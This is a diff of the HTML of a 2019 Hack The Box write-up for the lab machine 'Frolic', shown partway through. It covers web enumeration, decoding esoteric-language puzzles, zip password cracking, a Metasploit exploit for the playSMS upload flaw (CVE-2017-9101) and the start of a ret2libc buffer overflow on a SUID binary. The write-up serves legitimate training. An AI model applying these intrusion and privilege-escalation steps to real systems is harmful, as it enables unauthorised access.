 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
 <script>
@@ -31,75 +32,77 @@
   gtag('config', 'UA-97164925-2');
 </script>
 
-<body><header class="site-header" role="banner">
-
-  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
-        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
-        <label for="nav-trigger">
-          <span class="menu-icon">
-            <svg viewBox="0 0 18 15" width="18px" height="15px">
-              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
-            </svg>
-          </span>
-        </label>
-
-        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
-      </nav></div>
-</header>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
 
-  <header class="post-header">
-    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Frolic</h1>
-    <p class="post-meta">
-      <h7>
-        Tags: 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Linux/';">Linux</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Cryptography/';">Cryptography</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Buffer Overflow/';">Buffer Overflow</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Binary Exploitation/';">Binary Exploitation</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Exploit Development/';">Exploit Development</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/c/';">c</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Python/';">Python</button> 
-        
-      </h7>
-      <br>
-      <time class="dt-published" datetime="2019-03-23T00:00:00+02:00" itemprop="datePublished">Mar 23, 2019
-      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
-</p>
-  </header>
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - Frolic</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/cryptography/">cryptography</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+      <a class="tag" href="/tag/buffer-overflow/">buffer-overflow</a>
+      
+      <a class="tag" href="/tag/binary-exploitation/">binary-exploitation</a>
+      
+      <a class="tag" href="/tag/exploit-development/">exploit-development</a>
+      
+      <a class="tag" href="/tag/c/">c</a>
+      
+      <a class="tag" href="/tag/python/">python</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 23 Mar 2019</div>
+  
+  <div class="post-description">My write-up for Frolic from Hack The Box.</div>
+  
+  <hr />
 
-  <div class="post-content e-content" itemprop="articleBody">
-    <hr />
-
-<h3 id="quick-summary">Quick Summary</h3>
-<h4 id="hey-guys-today-frolic-retired-and-here-is-my-write-up-about-it-this-box-was-more-of-a-ctf-challenge-than-a-real-world-scenario--especially-the-user-part--but-it-was-nice-because-for-root-we-will-exploit-a-buffer-overflow-vulnerability-its-a-linux-box-and-its-ip-is-101010111--i-added-it-to-etchosts-as-frolichtb-lets-jump-right-in-">Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.111</code> , I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">frolic.htb</code>. Let’s jump right in !</h4>
-<p><img src="/images/hackthebox/frolic/0.png" alt="" /></p>
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.111</code> , I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">frolic.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/frolic/0.png" alt="" /></p>
 <hr />
 
-<h3 id="nmap">Nmap</h3>
-<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with nmap to scan for open ports and services :</h4>
-<p><code class="highlighter-rouge">nmap -sV -sT -sc frolic.htb</code>
-<img src="/images/hackthebox/frolic/1.png" alt="" /></p>
-<h4 id="we-got-ssh-on-port-22--smb-on-port-139-and-445-which-is-not-a-usual-thing-to-see-on-a-linux-box-and-http-on-port-9999-we-will-take-a-look-at-http-first">We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first.</h4>
-<p><br /></p>
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with nmap to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sc frolic.htb</code>
+<img src="/images/hackthebox/frolic/1.png" alt="" />
+<br /> We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first.
+<br /></p>
 <hr />
 
-<h3 id="http-initial-enumeration">HTTP Initial Enumeration</h3>
-<p><img src="/images/hackthebox/frolic/2.png" alt="" /></p>
-<h4 id="by-visiting-port-9999-we-get-the-welcome-page-of-nginx--so-we-will-use-gobuster-to-enumerate-sub-directories-">By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories :</h4>
+<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
+<p><img src="/images/hackthebox/frolic/2.png" alt="" />
+<br /> By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
 Gobuster v2.0.0              OJ Reeves (@TheColonial)
 =====================================================
@@ -121,12 +124,12 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 /test (Status: 301)
 =====================================================
 </code></pre></div></div>
-<h4 id="we-got-admin--backup--dev-and-test">We got <code class="highlighter-rouge">/admin</code> , <code class="highlighter-rouge">/backup</code> , <code class="highlighter-rouge">/dev</code> and <code class="highlighter-rouge">/test</code>.</h4>
-<h4 id="backup-"><code class="highlighter-rouge">/backup</code> :</h4>
-<p><img src="/images/hackthebox/frolic/3.png" alt="" /></p>
-<h4 id="dev-"><code class="highlighter-rouge">/dev</code> :</h4>
-<p><img src="/images/hackthebox/frolic/4.png" alt="" /></p>
-<h4 id="we-got-403-on-dev--lets-run-gobuster-again-on-dev-">We got <code class="highlighter-rouge">403</code> on <code class="highlighter-rouge">/dev</code> , let’s run gobuster again on <code class="highlighter-rouge">/dev</code> :</h4>
+<p><br /> We got <code class="highlighter-rouge">/admin</code> , <code class="highlighter-rouge">/backup</code> , <code class="highlighter-rouge">/dev</code> and <code class="highlighter-rouge">/test</code>.
+<br /> <code class="highlighter-rouge">/backup</code> :
+<img src="/images/hackthebox/frolic/3.png" alt="" />
+<br /> <code class="highlighter-rouge">/dev</code> :
+<img src="/images/hackthebox/frolic/4.png" alt="" />
+<br /> We got <code class="highlighter-rouge">403</code> on <code class="highlighter-rouge">/dev</code> , let’s run gobuster again on <code class="highlighter-rouge">/dev</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
 Gobuster v2.0.0              OJ Reeves (@TheColonial)
 =====================================================
@@ -146,26 +149,26 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 /test (Status: 200)
 =====================================================
 </code></pre></div></div>
-<h4 id="we-got-backup-and-test">We got <code class="highlighter-rouge">/backup</code> and <code class="highlighter-rouge">/test</code></h4>
-<h4 id="devbackup-"><code class="highlighter-rouge">/dev/backup</code> :</h4>
-<p><img src="/images/hackthebox/frolic/5.png" alt="" /></p>
-<h4 id="playsms--lets-check-that-"><code class="highlighter-rouge">/playsms</code> , Let’s check that :</h4>
-<p><img src="/images/hackthebox/frolic/6.png" alt="" /></p>
-<h4 id="it-asks-for-authentication--we-will-get-back-to-it-later-when-we-find-any-credentials-so-that-was-for-dev">It asks for authentication , we will get back to it later when we find any credentials. So that was for <code class="highlighter-rouge">/dev</code>.</h4>
-<h4 id="test-"><code class="highlighter-rouge">/test</code> :</h4>
-<p><img src="/images/hackthebox/frolic/7.png" alt="" /></p>
-<h4 id="its-just-the-phpinfo-page">It’s just the <code class="highlighter-rouge">phpinfo()</code> page</h4>
-<h4 id="admin-"><code class="highlighter-rouge">/admin</code> :</h4>
-<p><img src="/images/hackthebox/frolic/8.png" alt="" /></p>
-<h4 id="on-admin-theres-an-authentication-form--and-the-title-is-cmon-i-m-hackable-d">on <code class="highlighter-rouge">/admin</code> there’s an authentication form , and the title is “c’mon i m hackable” :D</h4>
-<p><br /></p>
+<p><br /> We got <code class="highlighter-rouge">/backup</code> and <code class="highlighter-rouge">/test</code>
+<br /> <code class="highlighter-rouge">/dev/backup</code> :
+<img src="/images/hackthebox/frolic/5.png" alt="" />
+<br /> <code class="highlighter-rouge">/playsms</code> , Let’s check that :
+<img src="/images/hackthebox/frolic/6.png" alt="" />
+<br /> It asks for authentication , we will get back to it later when we find any credentials. So that was for <code class="highlighter-rouge">/dev</code>. 
+<br /> <code class="highlighter-rouge">/test</code> :
+<img src="/images/hackthebox/frolic/7.png" alt="" />
+<br /> It’s just the <code class="highlighter-rouge">phpinfo()</code> page
+<br /> <code class="highlighter-rouge">/admin</code> :
+<img src="/images/hackthebox/frolic/8.png" alt="" />
+<br /> on <code class="highlighter-rouge">/admin</code> there’s an authentication form , and the title is “c’mon i m hackable” :D
+<br /></p>
 <hr />
 
-<h3 id="hacking-the-hackable-form">Hacking the “Hackable” form</h3>
-<h4 id="lets-take-a-look-at-the-source-code-">Let’s take a look at the source code :</h4>
-<p><img src="/images/hackthebox/frolic/9.png" alt="" /></p>
-<h4 id="we-notice-a-script-called-loginjs--maybe-authentication-is-handled-by-that-script">We notice a script called <code class="highlighter-rouge">login.js</code> , maybe authentication is handled by that script.</h4>
-<h4 id="loginjs-"><code class="highlighter-rouge">login.js</code> :</h4>
+<h2 id="hacking-the-hackable-form">Hacking the “Hackable” form</h2>
+<p><br /> Let’s take a look at the source code :
+<img src="/images/hackthebox/frolic/9.png" alt="" />
+<br /> We notice a script called <code class="highlighter-rouge">login.js</code> , maybe authentication is handled by that script.
+<br /> <code class="highlighter-rouge">login.js</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var attempt = 3; // Variable to count number of attempts.
 // Below function Executes on click of login button.
 function validate(){
@@ -189,117 +192,117 @@ return false;
 }
 }
 </code></pre></div></div>
-<p><img src="/images/hackthebox/frolic/10.png" alt="" /></p>
-<h4 id="we-got-the-username-and-the-password--adminsuperduperlooperpassword_lol">We got the username and the password : admin:superduperlooperpassword_lol</h4>
-<p><img src="/images/hackthebox/frolic/11.png" alt="" />
+<p><img src="/images/hackthebox/frolic/10.png" alt="" />
+<br /> We got the username and the password : admin:superduperlooperpassword_lol 
+<img src="/images/hackthebox/frolic/11.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/frolic/12.png" alt="" /></p>
-<h4 id="and-after-we-login-we-find--this-">And after we login we find … this :</h4>
+<img src="/images/hackthebox/frolic/12.png" alt="" />
+<br /> And after we login we find … this :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
 
 </code></pre></div></div>
 <p><img src="/images/hackthebox/frolic/13.png" alt="" /></p>
 <hr />
 
-<h3 id="ook">Ook!</h3>
-<h4 id="after-searching-on-google-for-a-long-time-i-found-out-that-this-is-an-esoteric-language-called-ook">After searching on google for a long time I found out that this is an esoteric language called <code class="highlighter-rouge">Ook!</code>.</h4>
-<h4 id="read-about-esoteric-languages-here">Read about esoteric languages <a href="https://esolangs.org/wiki/Main_Page">here</a></h4>
-<h4 id="read-about-ook-here">Read about <code class="highlighter-rouge">Ook!</code> <a href="https://esolangs.org/wiki/Ook!">here</a></h4>
-<h4 id="i-used-an-online-interpreter-for-ook-on-a-website-called-dcodefr">I used an <a href="https://www.dcode.fr/ook-language">online interpreter</a> for <code class="highlighter-rouge">Ook!</code> on a website called <a href="https://www.dcode.fr/">dcode.fr</a></h4>
-<p><img src="/images/hackthebox/frolic/14.png" alt="" /></p>
-<h4 id="output-">Output :</h4>
+<h2 id="ook">Ook!</h2>
+<p><br /> After searching on google for a long time I found out that this is an esoteric language called <code class="highlighter-rouge">Ook!</code>.
+<br /> Read about esoteric languages <a href="https://esolangs.org/wiki/Main_Page">here</a>
+<br /> Read about <code class="highlighter-rouge">Ook!</code> <a href="https://esolangs.org/wiki/Ook!">here</a>
+<br /> I used an <a href="https://www.dcode.fr/ook-language">online interpreter</a> for <code class="highlighter-rouge">Ook!</code> on a website called <a href="https://www.dcode.fr/">dcode.fr</a>
+<img src="/images/hackthebox/frolic/14.png" alt="" />
+<br /> Output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nothing here check /asdiSIAJJ0QWE9JAS
 </code></pre></div></div>
 <p><img src="/images/hackthebox/frolic/15.png" alt="" /></p>
 <hr />
 
-<h3 id="playsms-password">Playsms password</h3>
-<h4 id="asdisiajj0qwe9jas-"><code class="highlighter-rouge">/asdiSIAJJ0QWE9JAS</code> :</h4>
+<h2 id="playsms-password">Playsms password</h2>
+<p><br /> <code class="highlighter-rouge">/asdiSIAJJ0QWE9JAS</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA 
 
 </code></pre></div></div>
-<p><img src="/images/hackthebox/frolic/16.png" alt="" /></p>
-<h4 id="obviously-its-base64--so-i-copied-it-and-saved-it-in-a-txt-file-to-decode-it-">Obviously it’s base64 , so I copied it and saved it in a <code class="highlighter-rouge">txt</code> file to decode it :</h4>
-<p><img src="/images/hackthebox/frolic/17.png" alt="" />
+<p><img src="/images/hackthebox/frolic/16.png" alt="" />
+<br /> Obviously it’s base64 , so I copied it and saved it in a <code class="highlighter-rouge">txt</code> file to decode it :
+<img src="/images/hackthebox/frolic/17.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/frolic/18.png" alt="" /></p>
-<h4 id="we-got-a-weird-output--lets-redirect-the-output-into-a-file-and-check-what-kind-of-files-is-that-">We got a weird output , let’s redirect the output into a file and check what kind of files is that :</h4>
-<p><img src="/images/hackthebox/frolic/19.png" alt="" /></p>
-<h4 id="its-a-zip-archive--lets-unzip-it-">It’s a zip archive , let’s unzip it :</h4>
-<p><img src="/images/hackthebox/frolic/20.png" alt="" /></p>
-<h4 id="password-protected-theres-a-tool-called-fcrackzip-we-can-use-it-to-bruteforce-the-password-">Password protected. There’s a tool called <code class="highlighter-rouge">fcrackzip</code> we can use it to bruteforce the password :</h4>
-<p><code class="highlighter-rouge">fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt</code></p>
-<h4 id="the-password-is-password-">The password is “password” !</h4>
-<h4 id="after-extraction-we-get-a-file-called-indexphp-">After extraction we get a file called <code class="highlighter-rouge">index.php</code> :</h4>
+<img src="/images/hackthebox/frolic/18.png" alt="" />
+<br /> We got a weird output , let’s redirect the output into a file and check what kind of files is that :
+<img src="/images/hackthebox/frolic/19.png" alt="" />
+<br /> It’s a zip archive , let’s unzip it :
+<img src="/images/hackthebox/frolic/20.png" alt="" />
+<br /> Password protected. There’s a tool called <code class="highlighter-rouge">fcrackzip</code> we can use it to bruteforce the password :
+<code class="highlighter-rouge">fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt</code>
+<br /> The password is “password” !
+<br /> After extraction we get a file called <code class="highlighter-rouge">index.php</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
 
 </code></pre></div></div>
-<p><img src="/images/hackthebox/frolic/22.png" alt="" /></p>
-<h4 id="hex-encoded--lets-decode-it-i-will-use-a-website-called-cyberchef-">Hex encoded , let’s decode it. I will use a website called <a href="https://gchq.github.io/CyberChef/">CyberChef</a> :</h4>
-<p><img src="/images/hackthebox/frolic/23.png" alt="" /></p>
-<h4 id="base64-encoded-output--lets-decode-one-more-time-">Base64 encoded output , let’s decode one more time :</h4>
-<p><img src="/images/hackthebox/frolic/24.png" alt="" /></p>
-<h4 id="another-esoteric-language-but-this-time-its-a-famous-one--brainfuck-we-will-use-dcodefr-again-">Another esoteric language. But this time it’s a famous one , <code class="highlighter-rouge">brainfuck</code>. We will use <a href="https://www.dcode.fr/">dcode.fr</a> again :</h4>
-<p><img src="/images/hackthebox/frolic/25.png" alt="" /></p>
-<h4 id="output--1">Output :</h4>
-<p><code class="highlighter-rouge">idkwhatispass</code>
-<img src="/images/hackthebox/frolic/26.png" alt="" /></p>
-<h4 id="lets-try-to-login-to-playsms-as-admin-with-this-password-">Let’s try to login to playsms as admin with this password :</h4>
-<p><img src="/images/hackthebox/frolic/27.png" alt="" /></p>
-<h4 id="and-it-worked">And it worked.</h4>
-<p><br /></p>
+<p><img src="/images/hackthebox/frolic/22.png" alt="" />
+<br /> Hex encoded , let’s decode it. I will use a website called <a href="https://gchq.github.io/CyberChef/">CyberChef</a> :
+<img src="/images/hackthebox/frolic/23.png" alt="" />
+<br /> Base64 encoded output , let’s decode one more time :
+<img src="/images/hackthebox/frolic/24.png" alt="" />
+<br /> Another esoteric language. But this time it’s a famous one , <code class="highlighter-rouge">brainfuck</code>. We will use <a href="https://www.dcode.fr/">dcode.fr</a> again :
+<img src="/images/hackthebox/frolic/25.png" alt="" />
+<br /> Output :
+<code class="highlighter-rouge">idkwhatispass</code>
+<img src="/images/hackthebox/frolic/26.png" alt="" />
+<br /> Let’s try to login to playsms as admin with this password :
+<img src="/images/hackthebox/frolic/27.png" alt="" />
+<br /> And it worked.
+<br /></p>
 <hr />
 
-<h3 id="exploiting-authenticated-rce-and-getting-user">Exploiting Authenticated RCE and getting user</h3>
-<h4 id="there-are-some-known-vulnerabilities-for-playsms--one-of-them-is-an-authenticated-csv-file-upload-code-execution-cve-2017-9101-theres-also-a-metasploit-module-for-it">There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a <a href="https://www.rapid7.com/db/modules/exploit/multi/http/playsms_uploadcsv_exec">metasploit module</a> for it.</h4>
-<p><img src="/images/hackthebox/frolic/28.png" alt="" />
+<h2 id="exploiting-authenticated-rce-and-getting-user">Exploiting Authenticated RCE and getting user</h2>
+<p><br /> There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a <a href="https://www.rapid7.com/db/modules/exploit/multi/http/playsms_uploadcsv_exec">metasploit module</a> for it.
+<img src="/images/hackthebox/frolic/28.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/frolic/29.png" alt="" /></p>
-<h4 id="the-exploit-worked-and-we-have-a-meterpreter-session-now-">The exploit worked and we have a meterpreter session now :</h4>
-<p><img src="/images/hackthebox/frolic/30.png" alt="" /></p>
-<h4 id="we-owned-user-">We owned user !</h4>
-<p><br /></p>
+<img src="/images/hackthebox/frolic/29.png" alt="" />
+<br /> The exploit worked and we have a meterpreter session now :
+<img src="/images/hackthebox/frolic/30.png" alt="" />
+<br /> We owned user !
+<br /></p>
 <hr />
 
-<h3 id="buffer-overflow-in-rop">Buffer Overflow in rop</h3>
-<h4 id="in-the-home-directory-of-the-user-ayush-theres-a-directory-called-binary--which-has-a-binary-called-rop-we-can-verify-that-rop-is-suid-by-using-find">In the home directory of the user <code class="highlighter-rouge">ayush</code> there’s a directory called <code class="highlighter-rouge">.binary</code> , which has a binary called <code class="highlighter-rouge">rop</code>. we can verify that <code class="highlighter-rouge">rop</code> is <code class="highlighter-rouge">suid</code> by using <code class="highlighter-rouge">find</code>:</h4>
-<p><code class="highlighter-rouge">find /home/ayush/.binary/ -perm -4000</code>
-<img src="/images/hackthebox/frolic/32.png" alt="" /></p>
-<h4 id="lets-see-what-is-it-doing-">Let’s see what is it doing :</h4>
-<p><img src="/images/hackthebox/frolic/33.png" alt="" /></p>
-<h4 id="so-it-takes-our-input-and-just-ouputs-it--lets-try-giving-it-a-long-string-">So it takes our input and just ouputs it , Let’s try giving it a long string :</h4>
-<p><img src="/images/hackthebox/frolic/34.png" alt="" /></p>
-<h4 id="we-got-a-segmentation-fault--so-we-have-a-buffer-overflow-i-will-go-through-the-exploitation-without-explaining-everything-because-i-have-already-written-some-posts-about-buffer-overflow-you-can-check-them-here">We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them <a href="/categories/#binary-exploitation">here</a></h4>
-<h4 id="we-are-going-to-do-a-ret2libc-attack--if-you-are-unfamiliar-with-it--you-can-read-my-post-about-it-here">We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it <a href="/binary-exploitation/bof6/">here</a></h4>
-<h4 id="first-of-all--gdb-is-not-installed-on-the-box-">First of all , <code class="highlighter-rouge">gdb</code> is not installed on the box :</h4>
-<p><img src="/images/hackthebox/frolic/35.png" alt="" /></p>
-<h4 id="so-i-download-a-static-version-of-gdb-from-github--and-uploaded-it-to-the-box-through-the-meterpreter-session-upload-gdb">So I download a static version of <code class="highlighter-rouge">gdb</code> from <a href="https://github.com/hugsy/gdb-static/blob/master/gdb-7.10.1-x32">github</a> , and uploaded it to the box through the meterpreter session. <code class="highlighter-rouge">upload gdb</code></h4>
-<h4 id="lets-find-the-length-of-the-buffer-">Let’s find the length of the buffer :</h4>
-<p><img src="/images/hackthebox/frolic/36.png" alt="" />
+<h2 id="buffer-overflow-in-rop">Buffer Overflow in rop</h2>
+<p><br /> In the home directory of the user <code class="highlighter-rouge">ayush</code> there’s a directory called <code class="highlighter-rouge">.binary</code> , which has a binary called <code class="highlighter-rouge">rop</code>. we can verify that <code class="highlighter-rouge">rop</code> is <code class="highlighter-rouge">suid</code> by using <code class="highlighter-rouge">find</code>:
+<code class="highlighter-rouge">find /home/ayush/.binary/ -perm -4000</code>
+<img src="/images/hackthebox/frolic/32.png" alt="" />
+<br /> Let’s see what is it doing :
+<img src="/images/hackthebox/frolic/33.png" alt="" />
+<br /> So it takes our input and just ouputs it , Let’s try giving it a long string :
+<img src="/images/hackthebox/frolic/34.png" alt="" />
+<br /> We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them <a href="/categories/#binary-exploitation">here</a>
+<br /> We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it <a href="/binary-exploitation/bof6/">here</a>
+<br /> First of all , <code class="highlighter-rouge">gdb</code> is not installed on the box :
+<img src="/images/hackthebox/frolic/35.png" alt="" />
+<br /> So I download a static version of <code class="highlighter-rouge">gdb</code> from <a href="https://github.com/hugsy/gdb-static/blob/master/gdb-7.10.1-x32">github</a> , and uploaded it to the box through the meterpreter session. <code class="highlighter-rouge">upload gdb</code>
+<br /> Let’s find the length of the buffer :
+<img src="/images/hackthebox/frolic/36.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/frolic/37.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/frolic/38.png" alt="" /></p>
-<h4 id="so-the-buffer-overflows-after-52-chars-now-we-need-to-know-the-address-of-binsh--i-wont-do-it-like-i-did-before-by-loading-the-string-in-a-environment-variable-theres-a-better-way-to-do-it--first-thing-we-need-to-find-the-offset-of-binsh-in-libc--we-will-use-strings-to-get-the-address-">So the buffer overflows after 52 chars. Now we need to know the address of <code class="highlighter-rouge">/bin/sh</code> , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it , first thing we need to find the offset of <code class="highlighter-rouge">/bin/sh</code> in <code class="highlighter-rouge">libc</code> , we will use <code class="highlighter-rouge">strings</code> to get the address :</h4>
-<p><code class="highlighter-rouge">strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</code>
-<img src="/images/hackthebox/frolic/39.png" alt="" /></p>
-<h4 id="offset--0x0015ba0b">Offset : <code class="highlighter-rouge">0x0015ba0b</code></h4>
-<h4 id="then-we-need-the-address-of-libc--we-can-use-ldd-to-get-it-">Then we need the address of <code class="highlighter-rouge">libc</code> , we can use <code class="highlighter-rouge">ldd</code> to get it :</h4>
-<p><code class="highlighter-rouge">ldd rop</code>
-<img src="/images/hackthebox/frolic/40.png" alt="" /></p>
